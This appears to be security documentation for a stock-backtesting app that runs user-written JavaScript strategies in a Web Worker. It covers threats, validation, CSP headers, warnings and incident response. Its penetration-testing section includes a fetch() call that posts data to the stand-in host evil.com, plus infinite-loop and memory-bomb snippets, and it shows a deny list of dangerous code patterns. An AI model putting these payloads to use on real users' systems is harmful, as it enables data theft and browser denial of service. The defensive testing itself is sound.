## Custom Strategy Security

**⚠️ CRITICAL SECURITY WARNING ⚠️**

Custom strategies allow users to execute arbitrary JavaScript code in your application. While we use Web Workers for isolation, **this feature inherently carries significant security risks**.

## Threat Model

### What We Protect Against

✅ **DOM Access**
- Custom code runs in Web Worker (no DOM access)
- Cannot manipulate the page or steal user input

✅ **Network Access Restrictions**
- Web Worker has limited network access
- Cannot make arbitrary fetch() calls (blocked by CSP)

✅ **Execution Timeout**
- Strategies timeout after 30 seconds
- Prevents infinite loops from hanging the browser

✅ **Storage Isolation**
- Custom code cannot access localStorage/sessionStorage directly
- Strategies stored separately with validation

### What We DON'T Protect Against

❌ **Malicious Code Execution**
- If a user pastes malicious code, it WILL execute
- Web Worker isolation is NOT a complete sandbox
- Clever attackers can still cause harm

❌ **Data Exfiltration**
- Custom code can access the backtest data passed to it
- Could potentially send data to external servers (if CSP allows)
- No way to prevent code from "seeing" the data it operates on

❌ **Resource Exhaustion**
- Custom code can use excessive CPU
- Can allocate large amounts of memory
- Timeout helps but doesn't prevent all abuse

❌ **Supply Chain Attacks**
- If users import strategies from untrusted sources
- Malicious strategies could be disguised as legitimate ones

## Security Measures Implemented

### 1. Web Worker Isolation

Custom strategies execute in a Web Worker:

```typescript
const worker = new ExecutorWorker();
worker.postMessage(context);
```

**Benefits:**
- Runs in separate thread
- No direct DOM access
- Limited API surface

**Limitations:**
- Still has access to JavaScript runtime
- Can use CPU/memory
- Not a true sandbox

### 2. Code Validation

Basic validation before execution:

```typescript
// Check for dangerous patterns
const dangerousPatterns = [
  /localStorage/i,
  /sessionStorage/i,
  /fetch\s*\(/i,
  /XMLHttpRequest/i,
  /import\s+/i,
  /require\s*\(/i,
  /eval\s*\(/i,
  /Function\s*\(/i,
];
```

**Benefits:**
- Warns users about potentially unsafe code
- Catches obvious mistakes

**Limitations:**
- Can be bypassed with obfuscation
- Not comprehensive
- Many false positives/negatives

### 3. Execution Timeout

Strategies timeout after 30 seconds:

```typescript
const timeoutId = setTimeout(() => {
  worker.terminate();
  reject(new Error('Strategy execution timeout'));
}, timeout);
```

**Benefits:**
- Prevents infinite loops
- Limits resource usage

**Limitations:**
- 30 seconds is still a long time
- Doesn't prevent initial resource spike

### 4. localStorage Validation

Custom strategies validated before saving:

```typescript
const validation = this.validate(fullStrategy);
if (!validation.valid) {
  throw new Error(`Invalid strategy: ${validation.errors.join(', ')}`);
}
```

**Benefits:**
- Catches malformed strategies
- Provides user feedback

**Limitations:**
- Only validates structure, not logic
- Can't detect malicious intent

## Recommended Additional Security Measures

### For Production Deployment

**1. Content Security Policy (CSP)**

Add strict CSP headers:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'wasm-unsafe-eval';
  worker-src 'self' blob:;
  connect-src 'self' https://query1.finance.yahoo.com;
  style-src 'self' 'unsafe-inline';
```

**2. Subresource Integrity (SRI)**

If loading worker from CDN, use SRI:

```html
<script src="worker.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

**3. User Authentication**

Require authentication before allowing custom strategies:
- Prevents anonymous abuse
- Enables rate limiting
- Allows blocking bad actors

**4. Strategy Review System**

For shared/public strategies:
- Manual code review
- Automated security scanning
- Community reporting

**5. Rate Limiting**

Limit strategy execution:
- Max 10 backtests per minute per user
- Max 3 concurrent executions
- Longer cooldown for failures

**6. Monitoring**

Track custom strategy usage:
- Execution time metrics
- Error rates
- Resource consumption
- Anomaly detection

## User Warnings

### Display Before Enabling Custom Strategies

```
⚠️ SECURITY WARNING ⚠️

Custom strategies execute arbitrary code in your browser.

ONLY run strategies from sources you trust completely.

Malicious strategies could:
- Crash your browser
- Steal your data
- Send information to attackers

By enabling custom strategies, you accept these risks.

[I understand the risks] [Cancel]
```

### Display When Creating/Importing Strategy

```
⚠️ Code Execution Warning

This strategy will execute in your browser.

Before running:
- Review the code carefully
- Ensure you understand what it does
- Only import from trusted sources

Never run strategies from unknown sources.

[Review Code] [Cancel]
```

## Safe Usage Guidelines

### For Users

**DO:**
- ✅ Only use strategies you wrote yourself
- ✅ Review imported strategies line-by-line
- ✅ Test with small datasets first
- ✅ Use browser dev tools to monitor resource usage
- ✅ Keep strategies in version control

**DON'T:**
- ❌ Import strategies from untrusted websites
- ❌ Run obfuscated or minified code
- ❌ Share strategies with sensitive logic publicly
- ❌ Use strategies you don't understand
- ❌ Ignore warning messages

### For Developers

**DO:**
- ✅ Keep custom strategy feature opt-in
- ✅ Display prominent security warnings
- ✅ Validate strategies before execution
- ✅ Implement timeouts and resource limits
- ✅ Log strategy execution for debugging

**DON'T:**
- ❌ Auto-execute imported strategies
- ❌ Allow unauthenticated custom strategies
- ❌ Skip validation to "improve UX"
- ❌ Store strategies without encryption
- ❌ Mix custom and built-in strategies without clear distinction

## Incident Response

### If a Malicious Strategy is Discovered

1. **Immediate Actions**
   - Clear custom strategies from localStorage
   - Disable custom strategy feature temporarily
   - Alert affected users

2. **Investigation**
   - Analyze malicious code
   - Identify attack vector
   - Determine scope of impact

3. **Remediation**
   - Patch security hole
   - Improve validation
   - Update security warnings

4. **Communication**
   - Notify users transparently
   - Document incident
   - Share lessons learned

## Alternatives to Consider

If security concerns are too high:

**1. Server-Side Execution**
- Execute strategies on backend
- Better isolation and monitoring
- Slower (network latency)

**2. Configuration-Based Builder**
- No-code strategy builder
- Predefined components only
- Much safer but less flexible

**3. Approved Strategies Only**
- No custom code execution
- Users submit PRs to main repo
- Reviewed before inclusion

**4. Sandboxing Solutions**
- Use proper sandboxing (e.g., QuickJS-emscripten)
- More complex but safer
- Performance overhead

## Testing Security

### Penetration Testing Scenarios

**1. Resource Exhaustion**

```javascript
// Test: Infinite loop
while(true) {}
```

Expected: Timeout after 30s

**2. Data Exfiltration**

```javascript
// Test: Attempt to send data externally
fetch('https://evil.com', { method: 'POST', body: JSON.stringify(data) });
```

Expected: Blocked by CSP or caught in worker

**3. Storage Access**

```javascript
// Test: Attempt localStorage access
localStorage.setItem('steal', 'data');
```

Expected: Not available in worker context

**4. Memory Bomb**

```javascript
// Test: Allocate excessive memory
const huge = new Array(10000000).fill(0);
```

Expected: Browser may crash, but isolated to worker

## Conclusion

Custom strategies are a powerful feature but carry inherent risks. **Only enable this feature if:**

1. You understand the security implications
2. You trust your users to be responsible
3. You have monitoring and incident response in place
4. You display clear warnings
5. You keep the feature opt-in

When in doubt, prefer safer alternatives like configuration-based builders or approved strategies only.

**Security is not a feature to add later. Build it in from day one.**
